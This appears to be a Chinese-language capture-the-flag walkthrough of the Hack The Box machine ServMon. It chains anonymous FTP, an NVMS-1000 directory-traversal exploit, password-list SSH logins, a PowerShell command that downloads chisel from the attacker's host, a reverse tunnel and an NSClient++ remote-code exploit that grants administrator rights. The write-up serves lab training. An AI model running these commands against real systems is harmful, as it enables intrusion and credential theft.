# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测
```
┌──(root💀kali)-[~/htb/ServMon]
└─# nmap -sV -Pn 10.10.10.184 -p- 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-06 04:37 EST
Nmap scan report for 10.10.10.184
Host is up (0.34s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
80/tcp    open  http
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5666/tcp  open  tcpwrapped
6063/tcp  open  x11?
6699/tcp  open  napster?
8443/tcp  open  ssl/https-alt
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC


```

开启了很多服务，ftp，ssh，http，smb等等，一个个看。

80端口打开跳转到一个nvms的登录页面，登录账号未知

测试发现ftp可以匿名登录，那就先从ftp开始


## ftp匿名登录
```
┌──(root💀kali)-[~/htb/ServMon]
└─# ftp 10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  11:05AM       <DIR>          Users
226 Transfer complete.
ftp> cd Uswes
550 The system cannot find the file specified. 
ftp> cd Users
250 CWD command successful.
ftp> ls -alh
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  11:06AM       <DIR>          Nadine
01-18-20  11:08AM       <DIR>          Nathan

```

进去是一个Users文件夹，二级目录下有两个用户文件夹```Nadine```和```Nathan```，不错，得到两个用户名
把```Nadine/Confidential.txt```和```Nathan/Notes to do.txt```下载到本地分析


查看这两个文件
```
──(root💀kali)-[~/htb/ServMon]
└─# cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/htb/ServMon]
└─# cat 'Notes to do.txt'

1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint   
```

有点CTF的意思了。。。

根据提示可能有一个secure folder存放了Nathan修改后的password，这个密码可以用来登录NVMS后台
Nathan的桌面上有一个Passwords.txt文件


## 目录遍历
80端口的cms叫做```NVMS-10000```，经查看存在一个目录遍历漏洞

我在github上找到了[这个](https://github.com/AleDiBen/NVMS1000-Exploit)漏洞编号为``` CVE - 2019-20085```的exp

尝试读取```Windows/system.ini```文件

```
┌──(root💀kali)-[~/htb/ServMon]
└─# ./nvms.py 10.10.10.184 Windows/system.ini win.ini
[+] DT Attack Succeeded
[+] Saving File Content
[+] Saved
[+] File Content

++++++++++ BEGIN ++++++++++
; for 16-bit app support                                                                                                                                                                                                                    
[386Enh]                                                                                                  
woafont=dosapp.fon                                                                                            
EGA80WOA.FON=EGA80WOA.FON                                                                                           
EGA40WOA.FON=EGA40WOA.FON                                                                                            
CGA80WOA.FON=CGA80WOA.FON                                                                                            
CGA40WOA.FON=CGA40WOA.FON    
[drivers]                                                                                                          
wave=mmdrv.dll                                                                                                        
timer=timer.drv                                                                                                  
[mci]                                                                                                                                                                                                                                   
++++++++++  END  ++++++++++     
```

成功读取，现在读取Nathan桌面下的Passwords.txt
```
┌──(root💀kali)-[~/htb/ServMon]
└─# ./nvms.py 10.10.10.184 users/Nathan/Desktop/Passwords.txt Passwords.txt
[+] DT Attack Succeeded
[+] Saving File Content
[+] Saved
[+] File Content

++++++++++ BEGIN ++++++++++
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
                                                                                           
++++++++++  END  ++++++++++  
```

现在我们找到了一个密码字典，根据ftp的提示，其中一个是Nathan的密码

用这些密码尝试登陆web后台，失败
尝试用evil-winrm登陆Nathan的账号，失败
尝试用evil-winrm登陆Nadine的账号，失败
尝试用ssh登陆Nathan的账号，失败
有点小崩溃。。

最后ssh一个个遍历Nadine，成功了。。。

这个故事告诉我们枚举很重要。。

密码是：```L1k3B1gBut7s@W0rk```
```
ssh Nadine@10.10.10.184
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine

```
在nadine的桌面拿到user.txt

# 提权

查看所有本地的TCP连接
```
PS C:\Users\Nadine> netstat -ano|findstr TCP
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       2600
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2728
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5448
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       880
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5060
  TCP    0.0.0.0:5666           0.0.0.0:0              LISTENING       2708
  TCP    0.0.0.0:5666           0.0.0.0:0              LISTENING       2708
  TCP    0.0.0.0:6063           0.0.0.0:0              LISTENING       5448
  TCP    0.0.0.0:6699           0.0.0.0:0              LISTENING       5448
  TCP    0.0.0.0:8443           0.0.0.0:0              LISTENING       2708
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       488
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       924
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1348
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2192
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       624
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       2424
  TCP    10.10.10.184:22        10.10.14.16:51872      ESTABLISHED     2728
  TCP    10.10.10.184:22        10.10.14.16:51886      ESTABLISHED     2728
  TCP    10.10.10.184:139       0.0.0.0:0              LISTENING       4
  TCP    10.10.10.184:49699     10.10.14.16:8000       TIME_WAIT       0
  TCP    10.10.10.184:49704     10.10.14.16:8000       ESTABLISHED     5764
  TCP    127.0.0.1:49674        127.0.0.1:49675        ESTABLISHED     5448
  TCP    127.0.0.1:49675        127.0.0.1:49674        ESTABLISHED     5448
  TCP    127.0.0.1:49676        127.0.0.1:49677        ESTABLISHED     5448
  TCP    127.0.0.1:49677        127.0.0.1:49676        ESTABLISHED     5448
  TCP    [::]:21                [::]:0                 LISTENING       2600
  TCP    [::]:22                [::]:0                 LISTENING       2728
  TCP    [::]:135               [::]:0                 LISTENING       880
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5666              [::]:0                 LISTENING       2708
  TCP    [::]:49664             [::]:0                 LISTENING       632
  TCP    [::]:49665             [::]:0                 LISTENING       488
  TCP    [::]:49666             [::]:0                 LISTENING       924
  TCP    [::]:49667             [::]:0                 LISTENING       1348
  TCP    [::]:49668             [::]:0                 LISTENING       2192
  TCP    [::]:49669             [::]:0                 LISTENING       624
  TCP    [::]:49670             [::]:0                 LISTENING       2424

```

8443端口本地打开有一个NSClient++的页面，但是登陆的时候一直报```403 Your not allowed```

可能是限制了本地IP登陆

## 隧道连接服务

我们用chisel做一个隧道

把chisel.exe传到靶机
> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.16:8000/chisel.exe','C:\temp\chisel.exe')"

kali开启监听
> ./chisel server -p 8000 --reverse


windows连接
> .\chisel.exe client 10.10.14.16:8000 R:8443:localhost:8443


现在浏览器打开```https://127.0.0.1:8443/```再输入密码，报```403 Invalid password```

说明现在我们是允许登陆这个后台的

所以密码是什么呢？

点击```Forgotten password?```


```
NSClient++ password

The NSClient++ password can be found by running:

nscp web -- password --display

or you can sett a new password:

nscp web -- password --set new-password
```
显示我们用命令可以显示这个密码

来到：```C:\Program Files\NSClient++```

执行命令：```nscp web -- password --display```

```
nadine@SERVMON C:\>cd C:\Program Files\NSClient++

nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT


```

登陆密码是：```ew2x6SsGTxjRwXOT```

根据```NSClient++```关键字，我们在谷歌找到了[这个远程执行代码的exp](https://www.exploit-db.com/exploits/48360)

在这里我试过非常非常多的反弹shell的方法，因为靶机有个antivirus，很多exe文件都不能执行，powershell也不能反弹shell，苦恼。。。

假设这个程序是以超级管理员权限执行的，那么应该不需要反弹shell，把当前用户提升到管理员权限也是可以的

查看当前用户组，在users组
```
nadine@SERVMON c:\Temp>net user nadine
User name                    Nadine
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            14/01/2020 20:36:20                                                                                                                                                               
Password expires             Never
Password changeable          14/01/2020 20:36:20                                                                                                                                                               
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   08/12/2021 14:55:43                                                                                                                                                               

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.
```

执行提权，把nadine加到Administrators组
```
┌──(root💀kali)-[~/htb/ServMon]
└─# python3 exp.py -t 127.0.0.1 -P 8443 -p 'ew2x6SsGTxjRwXOT' -c 'cmd.exe /c net localgroup Administrators /add nadine'                                                                                       1 ⨯
[!] Targeting base URL https://127.0.0.1:8443
[!] Obtaining Authentication Token . . .
[+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ
[!] Enabling External Scripts Module . . .
[!] Configuring Script with Specified Payload . . .
[+] Added External Script (name: LnEZSwPpcJ)
[!] Saving Configuration . . .
[!] Reloading Application . . .
[!] Waiting for Application to reload . . .
[!] Obtaining Authentication Token . . .
[+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ
[!] Triggering payload, should execute shortly . . .
```

再次查看，已加到管理员组
```
nadine@SERVMON c:\Temp>net user nadine
User name                    Nadine
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            14/01/2020 20:36:20                                                                                                                                                               
Password expires             Never
Password changeable          14/01/2020 20:36:20                                                                                                                                                               
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   08/12/2021 14:55:43                                                                                                                                                               

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.
```

需注意，上面命令执行完成以后，我们还不能马上使得命令生效，需要退出当前ssh，重新登录

现在我们已经可以进管理员目录看到root.txt，但是还是没有查看权限。。
```
nadine@SERVMON C:\Users\Administrator>cd Desktop

nadine@SERVMON C:\Users\Administrator\Desktop>type root.txt
Access is denied.


```

修改root.txt文件的权限，nadine可以对其完全控制

```
nadine@SERVMON C:\Users\Administrator\Desktop>Cacls C:\Users\Administrator\Desktop\root.txt /t /e /c /g nadine:F
processed file: C:\Users\Administrator\Desktop\root.txt

nadine@SERVMON C:\Users\Administrator\Desktop>type root.txt
{就不告诉你：）}
```

成功读取到root.txt